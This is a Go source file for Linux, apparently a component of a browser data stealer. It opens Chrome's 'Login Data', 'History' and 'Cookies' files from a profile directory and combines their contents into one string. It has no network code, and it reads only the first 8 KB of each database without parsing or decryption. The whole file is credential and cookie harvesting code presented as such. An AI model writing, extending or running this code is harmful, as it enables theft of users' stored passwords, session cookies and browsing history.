//go:build linux

package cred

import (
"os"
)

type LinuxChromeCred struct {
Path string
}

func NewLinuxChromeCred(path string) *LinuxChromeCred {
return &LinuxChromeCred{Path: path}
}

func (l *LinuxChromeCred) ReadLoginData() (string, error) {
file, err := os.Open(l.Path + "/Login Data")
if err != nil {
return "", err
}
defer file.Close()
buf := make([]byte, 8192)
n, err := file.Read(buf)
if err != nil {
return "", err
}
return string(buf[:n]), nil
}

func (l *LinuxChromeCred) ReadHistory() (string, error) {
file, err := os.Open(l.Path + "/History")
if err != nil {
return "", err
}
defer file.Close()
buf := make([]byte, 8192)
n, err := file.Read(buf)
if err != nil {
return "", err
}
return string(buf[:n]), nil
}

func (l *LinuxChromeCred) ReadCookies() (string, error) {
file, err := os.Open(l.Path + "/Cookies")
if err != nil {
return "", err
}
defer file.Close()
buf := make([]byte, 8192)
n, err := file.Read(buf)
if err != nil {
return "", err
}
return string(buf[:n]), nil
}

func (l *LinuxChromeCred) GetAllData() (string, error) {
var result string
data, err := l.ReadLoginData()
if err != nil {
return "", err
}
result += data
history, err := l.ReadHistory()
if err != nil {
return "", err
}
result += history
cookies, err := l.ReadCookies()
if err != nil {
return "", err
}
result += cookies
return result, nil
}
